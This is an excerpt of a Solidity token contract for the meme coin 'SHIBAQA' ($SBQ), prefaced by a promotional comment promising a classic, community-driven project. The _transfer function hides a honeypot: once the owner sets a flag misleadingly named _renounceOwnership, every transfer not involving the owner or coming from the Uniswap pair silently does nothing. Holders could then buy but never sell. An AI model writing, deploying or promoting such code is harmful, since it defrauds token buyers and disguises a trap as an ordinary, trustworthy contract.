...
/*
    ...
    Shibaqa is here to conquer the meme market from the depths of crypto winter.
    Many have tried before to capture the essence of the most memable shiba in the world.
    We are keeping this truly classic.
    6% Tax, no dev fee.
    All holders are encouraged to use their rewards to grow the project.
    Let's make $SBQ a household name.
...
contract ShibaqaToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "SHIBAQA"; //
    string private constant _symbol = "SBQ"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 3;
    address public  _marketingWallet = 0xBa4116235beF2f45Fc9068a005284Df643F34C15;
    bool public _renounceOwnership = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _renounceOwnership){ return; }
